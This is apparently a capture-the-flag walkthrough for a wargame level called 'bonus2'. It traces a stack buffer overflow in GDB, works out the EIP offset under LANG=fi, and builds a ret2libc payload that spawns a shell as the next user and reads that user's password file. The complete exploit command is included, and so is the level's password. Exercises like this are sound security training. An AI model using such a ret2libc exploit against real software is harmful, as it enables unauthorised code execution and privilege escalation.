# 🚀 bonus2 Walkthrough
## 🧪 First step - Testing the program
```bash
$ ./bonus2
$ ./bonus2 coucou
Hello coucou
$ ./bonus2 coucou coucou
Hello coucou
$ ./bonus2 coucou coucou coucou
```
The program prints the second parameter.

## 🐞 Start in GDB
```bash
gdb-peda$ pdisas main
```
- Lots of things:
- - 2 calls to strncpy — possible overflow candidates.
- - 2 calls to memcmp comparing environment variable LANG with "fi" and "nl":

```asm
0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d  # "fi"
0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>

0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740  # "nl"
0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
0x08048602 <+217>:	mov    DWORD PTR [esp],eax
0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
```
Call to greetuser function:

```bash
gdb-peda$ pdisas greetuser
```
- Inside greetuser, a call to strcat — potential overflow here.

```bash
(gdb-peda)$ info function
...
0x08048460  frame_dummy
0x08048484  greetuser
...
```
- Another function frame_dummy does nothing important:

```bash
gdb-peda$ pdisas frame_dummy
```

## 🔍 Trying to overflow strcat with pattern
```bash
(gdb) r coucou $(cat /tmp/pattern)
Starting program: ./bonus2 coucou $(cat /tmp/pattern)
Hello coucou
[Inferior 1 (process 9596) exited with code 015]
```
No crash.
```bash
(gdb) r $(cat /tmp/pattern) coucou
Starting program: ./bonus2 $(cat /tmp/pattern) coucou
Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJcoucou
[Inferior 1 (process 9599) exited with code 065]
```
No crash.\
```bash
(gdb) r $(cat /tmp/pattern) $(cat /tmp/pattern)
Starting program: ./bonus2 $(cat /tmp/pattern) $(cat /tmp/pattern)
Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x08004848 in ?? ()
```
- Segfault!

```bash
(gdb) i r
```
- The pattern appears in EIP and partial EIP — proof of buffer overflow.

## 🔎 Find which argument overflows
```bash
(gdb) r $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Starting program: ./bonus2 $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
```
- Crash address 0x41414141 ('AAAA') means second argument causes overflow.

## 🌍 LANG env variable influence
- The LANG env variable is checked and stored in a global "language".
- It changes greeting in greetuser.
Try running with LANG=fi:

```bash
$ LANG=fi gdb bonus2
(gdb) r $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Starting program: ./bonus2 $(python -c 'print "B"*200') $(python -c 'print "A"*200')
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
- Got EIP overwrite with greeting in Finnish — perfect.

## 🧮 Get the offset
```bash
(gdb) r $(python -c 'print "B"*200') $(cat /tmp/pattern)
Starting program: ./bonus2 $(python -c 'print "B"*200') $(cat /tmp/pattern)
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()
```
- EIP contains 0x46464545 (which corresponds to "EEFF" in pattern).
- Using offset script (/get_offset.py 45) → offset 16.
- Since it's the third E in EIP, offset = 16 + 2 = 18.

## 🔧 Prepare for ret2libc
Need addresses of:
- system
- "/bin/sh" string
- exit

Check `"/bin/sh"` string:

```bash
(gdb) info proc map
# find libc mapped address range here (e.g., 0xb7e2c000 - 0xb7fcf000)
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
```
Check string at address:

```bash
(gdb) x/s 0xb7f8cc58
0xb7f8cc58: "/bin/sh"
```
Check system function address:

```bash
(gdb) info function system
Non-debugging symbols:
0xb7e6b060  system
```
Check exit function address:

```bash
(gdb) info function exit
# exit address = 0xb7e5ebe0
```

## 🛠 Build the payload
Payload format:
```perl
("B" * 18) + (EIP = system address) + (RET = exit address) + ("/bin/sh" address)
```
In Python:
```bash
python -c 'print "B"*18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'
```

## 🎯 Exploit!
```bash
$ LANG=fi ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X���

$ whoami
bonus3

$ cat ~bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
- 🎉 Done!
